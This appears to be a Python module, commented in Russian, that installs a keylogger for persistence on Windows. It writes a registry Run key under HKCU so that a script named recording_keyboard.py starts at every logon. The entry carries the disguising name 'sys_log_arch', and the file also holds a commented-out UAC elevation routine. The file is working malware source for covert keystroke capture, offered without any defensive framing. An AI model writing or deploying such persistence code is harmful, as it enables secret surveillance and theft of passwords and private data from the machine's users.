'''ФАЙЛ ПО АВТОЗАПУСКУ КЕЙЛОГЕРА, КОГДА ВКЛЮЧАЕТСЯ СИСТЕМА'''
import os
import sys
import ctypes
from recording_keyboard import start_keylogger


# функция проверки на наличие прав администратора
# def run_as_admin():
#     if ctypes.windll.shell32.IsUserAnAdmin():
#         return True
#     else:
#         # повышение привилегии
#         ctypes.windll.shell32.ShellExecuteW(None, "runas", sys.executable, " ".join(sys.argv), None, 1)
#         return False


# функция добавления файла в автозапуск
def add_to_startup(key, value):
    try:
        # Импорт библиотеки для работы с реестром
        import winreg as reg
    except ImportError:
        import _winreg as reg  # Для старых версий Python

    try:
        # Открываем ключ реестра
        reg_key = reg.HKEY_CURRENT_USER
        key_path = r"Software\Microsoft\Windows\CurrentVersion\Run"
        reg.CreateKey(reg_key, key_path)
        registry_key = reg.OpenKey(reg_key, key_path, 0, reg.KEY_WRITE)

        # Записываем значение в ключ реестра
        reg.SetValueEx(registry_key, key, 0, reg.REG_SZ, value)

        # Закрываем ключ реестра
        reg.CloseKey(registry_key)

        print(f"Автозапуск для {key} успешно настроен.")
    except Exception as e:
        print("Произошла ошибка:", str(e))


def main_startup():
    print("Для работы этого скрипта требуются права администратора.")

    # if not run_as_admin():
    #     return

    python_exe = sys.executable

    # Путь к вашему скрипту
    script_path = os.path.join(os.path.dirname(os.path.abspath(__file__)), 'recording_keyboard.py')

    # Создаем запись в реестре для автозапуска скрипта
    add_to_startup("sys_log_arch", f'"{python_exe}" "{script_path}"')
    print("Добавлено в автозапуск.")





